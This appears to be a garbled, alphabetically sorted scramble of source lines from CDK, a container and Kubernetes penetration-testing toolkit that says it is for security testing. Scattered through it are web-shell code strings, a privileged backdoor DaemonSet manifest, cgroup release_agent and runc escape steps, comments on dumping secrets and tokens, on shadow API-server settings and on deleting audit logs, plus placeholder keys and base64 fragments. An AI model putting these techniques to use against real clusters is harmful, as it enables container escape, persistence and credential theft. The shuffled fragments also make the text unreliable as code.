"util.PrintH2(""Discovery - K8s Service Account"")"
"util.PrintH2(""Exploit Pre - Kernel Exploits"")"
"util.PrintH2(""Information Gathering - ASLR"")"
"util.PrintH2(""Information Gathering - Cgroups"")"
"util.PrintH2(""Information Gathering - Commands and Capabilities"")"
"util.PrintH2(""Information Gathering - DNS-Based Service Discovery"")"
"util.PrintH2(""Information Gathering - Mounts"")"
"util.PrintH2(""Information Gathering - Net Namespace"")"
"util.PrintH2(""Information Gathering - Sensitive Files"")"
"util.PrintH2(""Information Gathering - Services"")"
"util.PrintH2(""Information Gathering - Sysctl Variables"")"
"util.PrintH2(""Information Gathering - System Info"")"
"util.PrintItemKey(""Setuid files found:"", false)"
"util.PrintItemValue(file, true)"
"util.PrintItemValueWithKeyOneLine(""refer"", ""https://github.com/mzet-/linux-exploit-suggester"", false)"
"util.RedBold.Printf("""
"util.RewriteFile(corePatternFile, corePatternPayload, 0644)"
"util.RewriteFile(expScript, expPayload, 0777)"
"v, _ := base64.StdEncoding.DecodeString(k.Get(""value"").String())"
"v, _ := version.NewVersion(serverVersion)"
"v2URL := fmt.Sprintf(""%sv2/"", imageRegistryURL)"
"value = """
"var AK = ""SKaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"""
"var ASLRSetting = ""/proc/sys/kernel/randomize_va_space"""
"var AWS = ""AKIA99999999999999AB"""
"var BannerVersion = fmt.Sprintf(""%s %s"", ""CDK Version(GitCommit):"", GitCommit)"
"var K8sDeploymentsAPI = ""/apis/apps/v1/namespaces/default/deployments"""
"var K8sSATokenDefaultPath = ""/var/run/secrets/kubernetes.io/serviceaccount/token"""
"var K8sServicesApi = ""/api/v1/namespaces/default/services"""
"var RouteLocalNetProcPath = ""/proc/sys/net/ipv4/conf/all/route_localnet"""
"var SensitiveEnvRegex = ""("
"var SensitiveProcessRegex = ""("
"var ThinIgnoreTool = ""You are using the thin version. In order to be more lightweight, this tool is not included in the thin version."""
"var TokenPath = """""
"var WebShellCodeJSP = ""<%Runtime.getRuntime().exec(request.getParameter("
"var WebShellCodePHP = ""<"
"var configmapApi = ""/api/v1/configmaps"""
"var cronJobAPI = ""/apis/batch/v1beta1/namespaces/kube-system/cronjobs"""
"var defaultPodApi = ""/api/v1/namespaces/default/pods"""
"var deviceCGroupPath = """""
"var deviceMarjor, deviceMinor string"
"var devicesAllowPath, devicesListPath string"
"var k8sCreateSystemPodAPI = ""/api/v1/namespaces/kube-system/pods"""
"var k8sDaemonsetApi = ""/apis/${API_VERSION}/namespaces/kube-system/daemonsets"""
"var k8sTokenPath = ""/registry/secrets/kube-system/"""
"var lib.Args[""<args>""]"
"var outFile = ""k8s_configmaps.json"""
"var outFile = ""k8s_pod_security_policies.json"""
"var outFile = ""k8s_secrets.json"""
"var outFile = fmt.Sprintf(""/cdk_cgexp_%s.sh"", taskRandString)"
"var outputFile = ""/cdk_cgres_"" "
"var param = ""cdk_"" "
"var payloadShellCmd = """""
"var pspApi = ""/apis/policy/v1beta1/podsecuritypolicies"""
"var pspRegexPat = ""spec"
"var rootDeviceAllow = fmt.Sprintf(""%s/devices.allow"", deviceCGroupPath)"
"var secretApi = ""/api/v1/secrets"""
"var stdout, stderr bytes.Buffer"
"var taskRandString, expShellText = generateShellExp(hostPath, cmd)"
"var token = """""
"verData, err := strconv.Atoi(v)"
"ver}"""
"watch  --header ""Authorization: Bearer xxx"" --cacert ca.crt"
"writeHandle, _ := os.OpenFile(""/proc/self/fd/"""
"writer := tabwriter.NewWriter(os.Stdout, 1, 1, 1, ' ', tabwriter.AlignRight"
"x00"""
"yaml:""apiVersion"""
"yaml:""certificate-authority-data"""
"yaml:""client-certificate-data"""
"yaml:""client-key-data"""
"yaml:""cluster"""
"yaml:""clusters"""
"yaml:""command,omitempty"""
"yaml:""containerPort"""
"yaml:""containers"""
"yaml:""context"""
"yaml:""contexts"""
"yaml:""current-context"""
"yaml:""image"""
"yaml:""kind"""
"yaml:""labels,omitempty"""
"yaml:""metadata"""
"yaml:""name"""
"yaml:""namespace,omitempty"""
"yaml:""ports,omitempty"""
"yaml:""preferences"""
"yaml:""server"""
"yaml:""spec"""
"yaml:""user"""
"yaml:""users"""
"{""apiVersion"":""extensions/v1beta1"",""kind"":""DaemonSet"",""metadata"":{""annotations"":{},""labels"":{""k8s-app"":""${K8S_APP}""},""name"":""cdk-backdoor-daemonset""},""spec"":{""selector"":{""matchLabels"":{""k8s-app"":""${K8S_APP}""}},""template"":{""metadata"":{""labels"":{""k8s-app"":""${K8S_APP}""}},""spec"":{""containers"":[{""command"":[""sleep"",""infinity""],""image"":""${IMAGE}"",""imagePullPolicy"":""IfNotPresent"",""name"":""cdk-backdoor-pod"",""securityContext"":{""capabilities"":{""add"":[""NET_ADMIN"",""SYS_ADMIN"",""SYS_PTRACE"",""AUDIT_CONTROL"",""MKNOD"",""SETFCAP""]},""privileged"":true},""volumeMounts"":[{""mountPath"":""/host-root"",""name"":""host-volume""}]}],""hostNetwork"":true,""hostPID"":true,""restartPolicy"":""Always"",""volumes"":[{""hostPath"":{""path"":""/""},""name"":""host-volume""}]}}}}"
"{""kind"":""Pod"",""apiVersion"":""v1"",""metadata"":{""name"":""kube-apiserver-cn-beijing.192.168.0.150"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/kube-apiserver-cn-beijing.192.168.0.150"",""uid"":""e2d1399d-4a4d-4d46-a1ed-9db5de9279eb"",""resourceVersion"":""35736383"",""creationTimestamp"":""2020-04-08T04:08:44Z"",""labels"":{""component"":""kube-apiserver"",""tier"":""control-plane""},""annotations"":{""kubernetes.io/config.hash"":""648fd8d160a03f8f137f14d7f47fad87"",""kubernetes.io/config.mirror"":""648fd8d160a03f8f137f14d7f47fad87"",""kubernetes.io/config.seen"":""2020-04-08T12:08:43.94847775"
"{""kind"":""PodList"",""apiVersion"":""v1"",""metadata"":{""selfLink"":""/api/v1/namespaces/kube-system/pods"",""resourceVersion"":""64714155""},""items"":[{""metadata"":{""name"":""alicloud-application-controller-68999d69df-6fbgg"",""generateName"":""alicloud-application-controller-68999d69df-"",""namespace"":""kube-system"",""selfLink"":""/api/v1/namespaces/kube-system/pods/alicloud-application-controller-68999d69df-6fbgg"",""uid"":""c61634a1-bf3b-4aa5-b5fb-f0ad51142c48"",""resourceVersion"":""1933"",""creationTimestamp"":""2020-04-08T04:12:32Z"",""labels"":{""app"":""alicloud-application-controller"",""owner"":""aliyun"",""pod-template-hash"":""68999d69df""},""annotations"":{""kubernetes.io/psp"":""ack.privileged""},""ownerReferences"":[{""apiVersion"":""apps/v1"",""kind"":""ReplicaSet"",""name"":""alicloud-application-controller-68999d69df"",""uid"":""4f2f3156-b2c5-4b32-9105-d1a97ab86d7e"",""controller"":true,""blockOwnerDeletion"":true}]},""spec"":{""volumes"":[{""name"":""admin-token-t8m2n"",""secret"":{""secretName"":""admin-token-t8m2n"",""defaultMode"":420}}],""containers"":[{""name"":""alicloud-application-controller"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-app-lifecycle-manager:v0.1.0.1-f832bed-aliyun"",""resources"":{""requests"":{""cpu"":""100m"",""memory"":""80Mi""}},""volumeMounts"":[{""name"":""admin-token-t8m2n"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}],""livenessProbe"":{""exec"":{""command"":[""sh"",""-c"",""ps -ef "
"{ContainerID: 0, HostID: syscall.Getegid(), Size: 1},"
"{ContainerID: 0, HostID: syscall.Geteuid(), Size: 1},"
"} else if token == """" {"
"} else if token, err := SecretToken(opts.TokenPath)"
"}(port, p) // send all sync objects into args"
"},RHEL=6{kernel:2.6.32-"
"},debian=10{kernel:4.19.0-"
"},debian=9{kernel:4.9.0-"
"},fedora=30{kernel:5.0.9-"
"},ubuntu=16.04{kernel:4.8.0-"
"},ubuntu=18.04{kernel:4.15.0-"
"},ubuntu=21.04{kernel:5.11.0-16-"
$ ]]
$2}'
$pkgName-[0-9]
${host_path}/exp.sh
${shellCmd} > ${hostPath}${outputFile}
${ver1[i]} < 10
${ver1[i]} > 10
${ver2[i]}))
' -F '$name:$version' 
' for easy handling multiple CVEs case - via extended regex)
([a-z0-9]
(on your host)
))]=$(cat <<EOF
)/work
): Invalid value: ([
- [CDK: Also a Awesome BugBounty Tool for Cloud Platform](https://github.com/neargle/slidefiles/blob/main/2021%20WHC2021%20CDK-Also-a-Awesome-BugBounty-Tool-for-Cloud-Platform.pptx.pdf)
- [http://kcon.knownsec.com/2021/
- [https://community.cncf.io/events/details/cncf-kcd-china-presents-kubernetes-community-days-china/](https://community.cncf.io/events/details/cncf-kcd-china-presents-kubernetes-community-days-china/)
- [https://github.com/knownsec/404StarLink2.0-Galaxy
- [https://www.blackhat.com/asia-21/arsenal/schedule/index.html
- kind: ServiceAccount
- kind: User
-([0-9a-fA-F]
---- 
---------- build CDK binary ----------
---------- upload all done ----------
-----------
----------------------
------------------------
------------------------------------------------------------
----------------------------------------------------------------------------
--------------------------------------------------------------------------------------
-----BEGIN RSA PRIVATE KEY-----
--fetch-binaries)
--fetch-sources)
--full
--full and -g
--full)
--help)
--kernel)
--pkglist-file)
--security-opt seccomp=unconfined --security-opt apparmor=unconfined
--short)
--show-dos)
--uname and -k
--uname)
--version)
-ARCH' 
-MANJARO' 
-[0-9]
-]//g' 
-deepin' 
-generic}
-release 
. usage: ./cdk run docker-api-pwn http://127.0.0.1:2375 
./cdk eva --full
./cdk kcurl
./cdk run
./cdk run lxcfs-rw
./cdk run lxcfs-rw-cgroup 'shell-cmd-payloads
./cdk run mount-disk
./cdk ucurl
.0-9
.DS_Store
.chglog/
.dockerenv
.el' 
.el[1-9]
.fc' 
.fc[1-9]
.git/
.idea
.json
.kube/
.mga' 
.mga[1-9]
.pip/
.pyc
.pyo
.slack
.sock
.svn/
.swp
.token
.vscode/
/.bash_history
/.bash_profile
/.bashrc
/.ssh/
//  
//     /proc/[pid]/setgroups file (see below) before writing to
//     gid_map.
//   apparmor should also be disabled.
//   https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
//   https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/
// - RDMA sub-cgroup will be released.
// - check 
// - check result.
// - create mountpoint 
// - create new namespace 
// - create subtasks cgroup 
// - mount to corresponding path 
// - run 
// - run a container with 
// - set host 
// - set notify_on_release to 1 
// - set release_agent to 
// - write exploit code to /exp.sh in container
// ./cdk eva 2>
// ./cdk ifconfig 
// ./cdk run k8s-psp-dump auto force-fuzz
// ./cdk run test-poc 
// 1. escape privileged container
// 2. escape --net=host
// 3. escape docker.sock
// 4. check k8s anonymous login
// 4. escape mounted lxcfs
// :    -
// APIs Ref https://github.com/AbsoZed/DockerPwn.py/blob/master/createContainer.py
// ASLR off: /proc/sys/kernel/randomize_va_space = 0 
// Anonymous mode
// BannerContainer is the banner of CDK command line with colorful.
// CAPStringsList cap strings with order
// CVE-2019-5736 exploit copied from https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go
// CallBasics is a function to call basic functions
// Check cloud provider APIs in evaluate task
// CheckDebugfs check if debugfs is installed
// CheckUnpriUserNS checks if the current host enable unprivileged user namespace.
// Colorful Bold
// CommandAllow check command allow to run
// Contributor: kmahyyg 
// DistinctArr distinct
// FindDir will return the first dir's absolute path in the given path
// FindSidFiles such as run 
// Fix a bug reported by the author of crossc2 on whc2021.
// GetCgroup returns the cgroup info of the process
// GetGateway returns the default gateway for the system.
// IntContains check string array contains a int number
// Invalid value: 
// IsDir return if the path is a dir
// Log all the log files in /var/log
// MaybeSuccessfulStatuscodeList from https://www.w3.org/Protocols/HTTP/HTRESP.html
// MountInfo
// Only v3 version is supported
// ReadLines reads a whole file into memory
// Ref https://github.com/kubernetes-client/python/blob/b79ad6837b2f5326c7dad488a64eed7c3987e856/kubernetes/README.md
// Responding to the case of mount the lxcfs path of other containers in the target container
// ShellExec run shell script by bash
// String format: major:minor root mountPoint opts - Fstype device SuperBlockOptions
// StringContains check string array contains a string
// SuperBlockOptions: per-superblock options (see mount(2)).
// TCP port scanner
// TESTExploit plugin interface
// TODO: check capabilites
// TODO: why default flag not to use default token(conf.K8sSATokenDefaultPath)
// TODO: why so may null byte in the Mounts
// The checkClose function calls close on a Closer and panics with a
// The local token file is obtained by default.
// ThinIgnoreTool Prompt the users that this tool is not included in the thin version.
// [Information Gathering - Mounts]
// [host] docker run -v /root/cdk:/cdk --rm -it --privileged ubuntu bash
// [host] docker run -v /root/cdk:/cdk --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bash
// [host] sysctl -w kernel.unprivileged_userns_clone=1
// [inside container] ./cdk run mount-cgroup ps
// add this to check if the container have device priv
// and returns a slice of its lines.
// apply regexp match
// auth token
// broken soft-link file will trigger panic in os.Stat().xxx()
// check /var/log mount
// check X-Envoy-Peer-Metadata-Id
// check bash command available
// check cgroup version
// check comments of abuse_unpriv_userns.go for more details
// check if api available
// check if api-server allows system:anonymous request
// check if system:anonymous can list namespaces
// check if the current service-account can list namespaces
// check kubelet endpoint and logs access
// check setuid bit
// check success string in buf and out
// check useful linux commands in container
// config for shadow api-server
// config.json file /run/containerd/io.containerd.runtime.v1.linux/moby/<id>/config.json
// create a pod with target serviceaccount token mounted
// create container with user cmd
// create mountpoint
// create sub-cgroup: task group x
// curl --unix-socket /var/run/docker.sock http://127.0.0.1/info
// current dir(pwd)
// current user(id)
// cve-2022-0492: only RDMA/MISC is available for exploit
// default:
// detect by /sys/fs/cgroup/cgroup.controllers
// devicemapper fs not overlay2 below
// do not print CVE number twice
// docopt argparse start
// drop non-pid
// enable notify_on_release
// err break
// escape done
// example
// example 1: workdir=/var/lib/docker/overlay2/9383b939bf4ed66b3f01990664d533f97f1cf9c544cb3f3d2830fe97136eb76f/work -> /data/docker/overlay2/f5aa028c48864dd7fefdd00230e6a6954d9292fdcc4e5f80575d186590ff6b5c
// example 2: workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/4301/work -> /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/4301
// example 3: /dev/mapper/docker-253:1-1316448-9ac38e89740bd1f1013d4060dd83f06d8035edfe80fefda72c7e5c6c44b5b10f -> /
// exceptional case:
// exploit interface implementation
// extract pod name
// find block device id
// find current container cgroup
// find lxcfs mount point for escape exploit
// find pods cgroup devices path
// find rw lxcfs
// fix 
// for 5.13
// format: mountID parentID major:minor root mountPoint opts - Fstype device SuperBlockOptions
// former Part
// found
// from https://github.com/mzet-/linux-exploit-suggester
// from https://man7.org/linux/man-pages/man5/proc.5.html
// from https://stackoverflow.com/questions/40682760/what-syscall-method-could-i-use-to-get-the-default-network-gateway
// from https://stackoverflow.com/questions/5884154/read-text-file-into-string-array-and-write
// from: https://github.com/kubernetes/kubernetes/issues/92315
// functional codes
// generate release_agent shell script and save to local
// get all available exploit
// get api-server connection conf in ENV
// get cgroup version V1/V2
// get container id
// get kernel version
// get log file in kubelet endpoint
// golang contributor think that there's no possible solution until now (2022-3).
// golang segment fault will not trigger core dump by default.
// grabbed from https://stackoverflow.com/questions/10485743/contains-method-for-a-slice
// grabbed from https://stackoverflow.com/questions/22892120/how-to-generate-a-random-string-of-a-fixed-length-in-go
// hook os.Args
// hostPath for write release_agent path
// hostname
// http client
// http post body for Docker API exploit
// https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
// https://docs.docker.com/engine/api/v1.24/
// https://elixir.bootlin.com/linux/v5.16.13/source/kernel/fork.c
// https://github.com/PaloAltoNetworks/can-ctr-escape-cve-2022-0492/blob/main/can-ctr-escape-cve-2022-0492.sh
// https://github.com/golang/go/issues/12125 (not resolved yet)
// https://github.com/golang/go/issues/22283
// https://github.com/jiguangin/netcat
// https://github.com/kubernetes/dns/blob/master/docs/specification.md
// https://man7.org/linux/man-pages/man5/proc.5.html
// https://man7.org/linux/man-pages/man7/user_namespaces.7.html
// https://twitter.com/_fel1x/status/1151487051986087936
// https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/
// hybrid mode will not work in container
// idea from https://blog.neargle.com/backup/CIS2020%20-%20Attack%20in%20a%20Service%20Mesh%20-%20Public.pdf
// inode of / is always 2 for ext4: https://ext4.wiki.kernel.org/index.php/Ext4_Disk_Layout
// iterate ip in task list
// iterate port from A-B
// iterate port in task list
// k8s backdoor daemonset
// k8s shadow api-server
// kernelExploitSuggester
// kubectl --server=https://<node-hostname>:9444/ --token=<token> --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A
// latter part
// linux-exploit-suggester.sh - a script to suggest possible exploits for a given Linux kernel version
// lock down the context
// loop through all mounted devices
// make capabilities readable
// make direct request to api-server REST API
// make sure env GOTRACEBACK=crash was set
// make target symbolic file link
// manual exploit:
// match ENV to find useful service
// match local file path to find sensitive file
// match pod name in selfLink
// match process name to find useful service
// mkdir
// mkdir and mount
// modified due to limitation of 
// more specifically: https://github.com/golang/go/issues/50098
// mount
// mount cgroup
// mountID = fields[0] 
// need to set 
// oldStdout := os.Stdout
// only return one pod
// or /proc/filesystems
// or an error if an error occurred reading the file
// or directly try to mount cgroup2 with none
// or use c codes instead to trigger crash
// os.Stdout = oldStdout
// os.Stdout = w
// os/kernel version
// others:
// parse token
// patch cdxy 20210413
// patch for Tencent TKE
// pkg/exploit/file_scan.go
// plugin interface
// print all device and mount them to random path under /tmp
// print all exploit and after 10 lines
// pull image alpine
// read file text
// redirect output to current tty
// ref https://docs.docker.com/engine/api/v1.24/
// reference something bind mounted to container from host
// reference:
// reg = regexp.MustCompile(
// register all kinds of exploits
// related golang issue:
// reload this exploit with origin args
// remove audit logs to get stealth
// return [true/false] when [normal exit/fatal]
// return to os.Stdout default
// rewrite and mknod
// rootfs path /var/lib/docker/overlay2/<id>/merged
// run 
// run command get output
// run linux-exploit-suggester bash script to check kernel exploit
// run next account/username
// runtime error if the Closer returns an error
// same way as call unshare
// sample:
// scan file text to find AK/Secrets
// set --allow-privileged=true
// set --secure-port to 9444
// set all block device accessible
// set anonymous-auth to true
// set authorization-mode=AlwaysAllow
// set insecure-port to 0.0.0.0:9443
// set request header
// skip executable file
// skip large file
// skip left side null
// skip soft-link
// sleep 2s for debug purpose
// sourcecode: https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/v1.1/linux-exploit-suggester.sh
// start actual exploit
// start container
// start exploit
// step1. create Mitm Deployments
// step2. create Mitm Services of ExternalIPs
// support for cdk eva(Evangelion) and cdk evaluate
// support username/password list file
// switch runtime.GOOS {
// task interface
// tested in ubuntu docker
// the best way to find container id and current cgroup devices.allow
// this is the exploit of
// trigger core dump in crash
// trigger release
// try to exec shell cmd via cgroup-mount exploit
// try to write crontab after running device-mount exploit
// unexpect mountinfo
// unshare can only be used in single-thread program. Golang program is always multi-thread.
// use https://github.com/mzet-/linux-exploit-suggester to check kernel exploit
// use like 
// use lxcfs_rw exp function by https://github.com/yeahx
// use regexp to find gitVersion
// version: 1.1
// w.Close()
// we can run fuzz anyway
// write PID to cgroup.procs
// write release_agent
// write shellcode to host /etc/crontab via mounted dir
// }
//// call unshare then execute
//// then execute mount-cgroup exploit with rdma subsystem
//argInsertReg := regexp.MustCompile(
//cat $host_path/output
//chmod a
//defer func() {
//defer resp.Body.Close()
//echo '
//echo 1 > /tmp/cgrp/cdk/notify_on_release
//go:build !no_abuse_unpriv_userns 
//go:build !no_check_ptrace
//go:build !no_deploy_webshell
//go:build !no_docker_api_pwn
//go:build !no_docker_runc
//go:build !no_docker_sock_check
//go:build !no_docker_sock_pwn
//go:build !no_etcd_get_k8s_token
//go:build !no_file_scan
//go:build !no_image_registry_brute
//go:build !no_istio_check
//go:build !no_k8s_backdoor_daemonset
//go:build !no_k8s_clusterip_mitm
//go:build !no_k8s_configmap_dump
//go:build !no_k8s_cronjob
//go:build !no_k8s_get_sa_token
//go:build !no_k8s_secret_dump
//go:build !no_kubelet_exec
//go:build !no_kubelet_var_log_escape
//go:build !no_lxcfs_rw 
//go:build !no_mount_cgroup 
//go:build !no_mount_device
//go:build !no_mount_procfs
//go:build !no_probe_tool
//go:build !no_reverse_shell
//go:build !no_rewrite_cgroup_devices
//go:build !no_service_probe
//go:build !thin 
//go:build linux 
//go:embed assets/kubectl-amd64
//host_path=
//https://github.com/kubernetes/client-go/blob/66db2540991da169fb60fce735064a55bfc52b71/rest/config.go
//if err != nil {
//if success {
//if util.IsSoftLink(currentPath) 
//if util.IsSoftLink(path) {
//log.Fatal(err) //ignore fatal errors
//mkdir -p /tmp/cgrp 
//sleep 1
//success = escaping.ExploitLXCFS()
//} else {
//}()
/6zg
/arsenal)
/arsenal](http://kcon.knownsec.com/2021/
/bin
/cdk
/cdk_release_binary
/cmd/cdk/
/config.json
/containerd.sock
/containerd/s/
/dev/[
/dev/mapper/[
/docker.sock
/etc/[
/etc/host[
/etc/mtab
/host
/pkg/tool/kubectl/assets/
/proc/self/cgroup
/serviceaccount
/vendor
/venv
033')
0QI4U9JINXYJlOz9yiaiPQ2wMU=
0bjPO0LkuOLi4/5GtJWs/s=
0owSTG1fDTci4IqFcE=
0xfcU
1) if we're in '--uname' mode and there's a TAG for OS from uname string
1. Evaluate: gather information inside container to find potential weakness.
1/p' /etc/mtab
10).
10).0-(19
10.04
10.10
10.10){kernel:2.6.(31
10.10){kernel:2.6.(32
11).0-(12
11.10){kernel:3.0.0-12-(generic
12.04
13.10){kernel:3.(8
14.04
14.04){kernel:3.13.0-(2
15.04){kernel:3.(13
15.10){kernel:4.2.0-(18
16).0-
16.04
16.04){kernel:4.4.0-(21
16.04){kernel:4.4.0-62-generic}
16.04.2
16.10
17.04){kernel:4.(8
19)-(server
19)-generic}
1ngSBFLxvqU3pZ
2. Inside the victim container execute
21)-server}
22)-generic}
24)-generic}
24)-server}
29)-generic}
2E5dAYhXwXZwtnZ6UAqBI28
3.(0
3.10.0-514.26.1}
30000-32767
31-containers
32)-(14
33)-
34m'
35)-(1
35)-(14
35)-(19
36m'
37 https://github.com/cdk-team/CDK/issues/37
37m'
3DrKY5ROCorDFahq8l0tey/Lx1fg=
3Zlu5yQgKGP2/hcQbHb7S9Y=
4.8.0}
45)-generic}
5).0-(23
51)-generic}
52)-
56JwCaLick0ClmMTw=
5W64v3OgClL
6aFIbp5/iudMxNCF27Vw2OZgy4xEx0Fg=
7DI1oQLdmnep86tWFlaaUAac=
7OoQ1Bc6eTm5niUzBa0Ctsh6JbMW6Ra
8e9klMJ9c=
8fI=
9.04
9.10){kernel:2.6.(31
93m'
:18659:0:99999:7:::
:19173:0:99999:7:::
<-quit
<-sigs
</a>
<token-path>) (min
= 1 
= filename[1] 
> ./cdk eva --full
> ./cdk run cap-dac-read-search
@/containerd-shim/[
AKIAVA9
API           string
APIVersion         string 
APIVersion     string    
APIVersion  string    
APIVersion string   
ARGS=
ASLR()
AZZE=
A][c
A][p
Affinity                     Affinity      
Affinity      map[string]interface{} 
Annotations       map[string]string 
Anonymous bool
AnonymousFlag = true
Api       string
Args = args
Args:
Auto Escape:
Available Capabilities
Available Linux Commands
Avatar 
B][o
BasicSysInfo()
BlockOwnerDeletion bool   
BlueBold   = color.New(color.FgBlue).Add(color.Bold)
C64Yfv1cQ7kz7rIZviUmN
CCe6H6itr9pbZ/vx1Dm
CDK (Container DucK)
CDK has three modules:
CDK is for security testing purposes only.
CDKRuntimeError) Error() string {
CLONE_FS
CONFIG_.
CVE-2016-6662]${txtrst} mysql-exploit-chain
C][e
C][r
CapBnd
CapEff
CapPrm
Capabilities
CertificateAuthorityData string 
CgroupPath    string
CheckCloudMetadataAPI()
CheckK8sAnonymousLogin()
CheckNetNamespace()
CheckPidInject()
CheckPrivilegedK8sServiceAccount(conf.K8sSATokenDefaultPath)
CheckRouteLocalNetworkValue()
ClientCertificateData string 
ClientKeyData         string 
Cloud Provider Metadata API
CloudProvider string
Cluster ClusterInfo 
Cluster string 
Clusters       []Cluster 
Code    int
Color bool
ColorDebugPrefix = GreenBold.Sprint(DebugPrefix)
ColorErrorPrefix = RedBold.Sprint(ErrorPrefix)
ColorInfoPrefix  = BlueBold.Sprint(InfoPrefix)
ColorWarnPrefix  = YellowBold.Sprint(WarnPrefix)
Command
Command []string          
Command bool
Comments:
Comments: /proc/sys/vm/mmap_min_addr needs to equal 0
Comments: /proc/sys/vm/mmap_min_addr needs to equal 0 OR pulseaudio needs to be installed
Comments: Affects only Debian-based distros
Comments: Affects only RedHat-based distros
Comments: Allows priv escalation from nagios user or nagios group
Comments: Also MariaDB ver<10.1.18 and ver<10.0.28 affected
Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels
Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only
Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels
Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled
Comments: CONFIG_BPF_SYSCALL needs to be set 
Comments: CONFIG_SLAB_FREELIST_HARDENED must not be enabled
Comments: CONFIG_USER_NS needs to be enabled
Comments: CONFIG_USER_NS needs to be enabled 
Comments: CONFIG_X86_X32 needs to be enabled
Comments: Distros use own versioning scheme. Manual verification needed.
Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
Comments: Exploit takes about 
Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
Comments: Known to work only for 2.4 series (even though 2.6 is also vulnerable)
Comments: Needs admin interaction (root user needs to login via ssh to trigger exploitation)
Comments: Needs cron or system admin interaction
Comments: Needs to be sudoer. Works only on SELinux enabled systems
Comments: No SMEP/SMAP bypass
Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass
Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user
Comments: Requires an active PolKit agent.
Comments: Requires an administrator to login via the web interface.
Comments: Rooting depends on cron.daily (up to 24h of delay). Affected: deb8: <1.6.2
Comments: Rooting depends on the crontab (up to one day of delay)
Comments: SSH access to non privileged user is needed
Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed
Comments: Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed 
Comments: Works for systems with /proc/sys/vm/mmap_min_addr equal to 0
Comments: X.Org Server before 1.20.3 is vulnerable. Distros use own versioning scheme. Manual verification needed.
Comments: ip_tables kernel module must be loaded
Comments: ip_tables.ko needs to be loaded
Comments: kernel.unprivileged_userns_clone=1 required
Comments: rds.ko kernel module needs to be loaded. Modified version at 'ext-url' adds support for additional targets and bypassing KASLR.
Comments: sudo configuration requires pwfeedback to be enabled.
Comments: world-writable sgid directory and shell that does not drop sgid privs upon exec (ash/sash) are required
Conditions        []Condition        
ContainerID string      
ContainerPort int    
ContainerStateRunning 
ContainerStateTerminated 
ContainerStateWaiting 
ContainerStatuses []ContainerStatus  
Containers                   []Container   
Containers    map[string]interface{} 
Context ContextInfo 
Contexts       []Context 
Controller         bool   
Convert {
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .
CreationTimestamp time.Time         
Critical - Possible Privileged Container Found.
Critical - SYS_ADMIN Capability Found. Try 'cdk run rewrite-cgroup-devices/mount-cgroup/...'.
CurrentContext string    
CustomMsg string
DEBUG
DISTRIB_RELEASE=
DJW3UT/LiOwJeYQe1efqtUx/iVham/4vfdArNI=
DNS-Based Service Discovery
DNSBasedServiceDiscovery()
DNSPolicy                    string        
Desc        string
Desc string
Desc() string
Description
Device            string
Discovery
DocURL        string
Download latest release in https://github.com/cdk-team/CDK/releases/
Drop executable files into the target container and start testing.
DumpCgroup()
DwF1aE
E42TnysNCUPdjciGhY=
ECip1KBveYUHfp
ERROR Level = iota
EXPLOITS[((n
EXPLOITS_USERSPACE[((n
E][b
E][c
E][r
E][t
E][y
Edit Files
Effect            string 
EgEM=
Endpoint  string
English 
Enhancement suggestions are tracked as [GitHub Discussions](https://github.com/cdk-team/CDK/discussions). You can publish any thoughts here to discuss with developers directly.
Env             []EnvVar        
Err       error
Evaluate:
Example:
Example: 
Exec() bool
ExitCode int    
Exploit:
ExploitType string
Exploits = make(map[string]ExploitInterface)
Exploits[name] = exploit
Exploits[name].Run()
F/uYJDktmvLPf7qIgjc=
F1NCffTKKLShY6zXTItVIZ8M=
FEATURES[((n
F][a
FieldsType  string    
FieldsV1    FieldsV1  
FindSidFiles()
Fix problems or maintain CDK's quality:
From int
Fstype            string
G][i
GenerateName      string            
GenerateName string            
GetExploitType() string
GetProcCapabilities()
GidMappings: []syscall.SysProcIDMap{
GreenBold  = color.New(color.FgGreen).Add(color.Bold)
GreenBold.Sprint(str)
H1uAHpcLFnEyAGVDL/k47Jfbm0A=
H][e
H][u
Header isioHeader 
Help    bool
HierarchyID   int
Ho715JplO36QYgwN9PGYNhgZvoUSc9X2c80KVTi
Host    string
HostIP            string             
HostPort      int    
IFS=$'
INFO
IP string 
IP/Port Scanning
I][_]
I][t
Image           string          
Image       string      
ImageID     string      
Information Gathering
IrOD63t4i/RW7RqrAVl9LTZ9UqQ=
Items      []Pod    
K8s Api-server Info
K8s Service-account Info
KVBBkLxYdkEeeFHuqr95GfClRLKlgK0E=
K][e
K][u
Key               string 
Key      string   
Kind               string 
Kind           string    
Kind       string   
Kube-proxy Route Localnet(CVE-2020-8558)
L2957
L2hUp1rHADufV3IMtnDRdf1r5NINEl0=
L483
Labels            map[string]string 
Labels       map[string]string 
LastProbeTime      time.Time 
LastState   ContainerState 
LastTransitionTime time.Time 
Level Level
